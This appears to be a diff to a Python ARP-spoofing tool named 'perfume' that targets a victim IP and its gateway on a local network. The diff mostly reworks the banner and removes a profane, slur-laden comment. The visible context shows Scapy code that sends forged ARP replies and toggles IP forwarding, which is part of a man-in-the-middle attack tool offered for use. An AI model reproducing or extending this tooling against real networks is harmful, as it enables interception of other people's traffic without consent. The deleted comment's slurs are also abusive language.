@@ -6,16 +6,24 @@ import os
 # usage " python perfume.py "
 
 ## THIS TOOL IS CREATED BY WHOAMIANOOB !
-## AND IF YOU SAW THIS CODE TO STEAL CREDITS !
-## YOU ARE A NOOB COCKSUCKER !!
-## FUCK YOU SCRIPT KIDDO !!
 
 # INTRO !!
-print ("++++++++++++++++++++++++++++++++++++++++++++++++")
-print ("++++++++++ perfume by whoamianoob ! ++++++++++++")
-print ("++++++++++++++++++++++++++++++++++++++++++++++++")
+def banner():
+ print("\033[0;32m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
+ print("\033[0;32m @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@")
+ print("\033[0;32m @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@")
+ print("\033[0;32m @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@")
+ print("\033[0;32m @@@@@@@    @@@@@@@@@     @@@@@@@@@@@    @@@@@@@")
+ print("\033[0;32m @@@@@@@    @@@@@@@@@     @@@@@@@@@@@    @@@@@@@")
+ print("\033[0;32m @@@@@@@                                 @@@@@@@")
+ print("\033[0;32m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
+ print("\033[0;32m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
+ print("\033[0;34m -----------------------------------------------")
+ print("\033[0;31m       *-* PERFUME BY WHOAMIANOOB *-*           ")
+
 time.sleep(2)
 os.system("clear")
+banner()
 
 # GETTING REQUIRED INPUTS FROM USER !!
 
@@ -54,7 +62,7 @@ def reARP():
         gateMAC = get_mac(gateip)
         send(ARP(op = 2, pdst = gateip, psrc = victimip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
         send(ARP(op =2, pdst = victimip, psrc = gateip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
-        print("[*] DISABLING IP FORWARDING.....")
+        print("[*] KILLING IP FORWARDING.....")
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("[*] SHUTTING DOWN ...")
         sys.exit(1)
